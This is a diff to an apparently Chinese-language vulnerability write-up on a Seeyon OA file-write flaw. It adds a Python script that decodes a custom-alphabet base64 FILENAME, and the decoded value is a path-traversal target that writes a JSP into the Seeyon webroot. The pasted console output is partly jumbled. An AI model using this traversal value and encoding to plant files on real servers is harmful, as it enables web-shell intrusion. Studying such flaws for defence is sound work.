@@ -350,7 +350,34 @@ FILENAME= ..\..\..\ApacheJetspeed\webapps\seeyon\test123456.jsp
 needReadFile= 1558275164
 Encode FILENAME= qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
 ```
+### python 脚本转换
+```
+import base64
+from string import maketrans
 
+a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
+b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+encode_str = "qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6"
+table = maketrans(a, b)
+print base64.b64decode(encode_str.translate(table))
+```
+console
+```
+>>> import base64
+liN4KXwiVGzfT2dEg6"
+table = maketrans(a, b)
+print base64.b64decode(encode_str.translate(table))>>> from string import maketrans
+>>> 
+>>> a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
+>>> b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+>>> encode_str = "qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6"
+>>> table = maketrans(a, b)
+>>> print base64.b64decode(encode_str.translate(table))
+>>>
+..\..\..\ApacheJetspeed\webapps\seeyon\test123456.jsp
+>>> 
+
+```
 ## POST报文验证
 
 ![](./poc.png)
